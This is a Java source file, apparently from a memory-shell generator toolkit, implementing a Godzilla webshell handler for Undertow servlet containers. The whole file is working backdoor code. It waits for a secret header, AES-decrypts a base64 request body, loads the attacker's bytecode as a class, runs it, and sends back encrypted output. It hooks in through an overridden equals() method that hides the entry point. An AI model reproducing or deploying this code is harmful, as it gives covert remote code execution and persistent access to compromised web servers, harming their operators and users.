package com.reajason.javaweb.memshell.shelltool.godzilla.hw;

import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/**
 * Godzilla HW UndertowServletHandler 模板（JAVA_AES_RAW_BASE64）。
 * <p>
 * 只包含当前加密器的协议，由 {@link GodzillaHwGenerator} 按配置选择；
 * 请求/响应统一通过反射访问，容器钩子只需传入 request/response。
 *
 * @author ReaJason
 */
public class GodzillaHwUndertowServletHandlerRawBase64 extends ClassLoader {
    private static String key;
    private static String md5;
    private static String headerName;
    private static String headerValue;
    private static Class<?> payload;


    public GodzillaHwUndertowServletHandlerRawBase64() {
    }

    public GodzillaHwUndertowServletHandlerRawBase64(ClassLoader parent) {
        super(parent);
    }

    @Override
    @SuppressWarnings("all")
    public boolean equals(Object obj) {
        Object[] args = (Object[]) obj;
        try {
            Object context = args.length == 2 ? args[1] : args[2];
            Object request = context.getClass().getMethod("getServletRequest").invoke(context);
            Object response = context.getClass().getMethod("getServletResponse").invoke(context);
            return run(request, response);
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return false;
    }

    @SuppressWarnings("all")
    private boolean run(Object request, Object response) throws Exception {
        String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
        if (value == null || !value.contains(headerValue)) {
            return false;
        }
        byte[] body = readBody(request);
        byte[] data = x(base64Decode(new String(body, "UTF-8")), false);
        if (payload == null) {
            payload = this.defineClass(data, 0, data.length);
            return true;
        }
        PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
        try {
            byte[] result = execute(request, data);
            writer.write(md5.substring(0, 16));
            writer.write(base64Encode(x(result, true)));
            writer.write(md5.substring(16));
        } catch (Throwable e) {
            writer.write(getErrorMessage(e));
        }
        writer.flush();
        writer.close();
        return true;
    }

    @SuppressWarnings("all")
    private static byte[] execute(Object request, byte[] data) throws Exception {
        ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
        Object f = payload.newInstance();
        f.equals(arrOut);
        f.equals(request);
        f.equals(data);
        f.toString();
        return arrOut.toByteArray();
    }

    @SuppressWarnings("all")
    private static byte[] readBody(Object request) throws Exception {
        java.io.InputStream inputStream = (java.io.InputStream) request.getClass().getMethod("getInputStream").invoke(request);
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        byte[] buffer = new byte[8192];
        int read;
        while ((read = inputStream.read(buffer)) > 0) {
            outputStream.write(buffer, 0, read);
        }
        return outputStream.toByteArray();
    }
    @SuppressWarnings("all")
    public static String base64Encode(byte[] bs) throws Exception {
        try {
            Object encoder = Class.forName("java.util.Base64").getMethod("getEncoder").invoke(null);
            return (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var6) {
            Object encoder = Class.forName("sun.misc.BASE64Encoder").newInstance();
            return (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
        }
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }
    @SuppressWarnings("all")
    public byte[] x(byte[] s, boolean m) throws Exception {
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
        return cipher.doFinal(s);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }

}
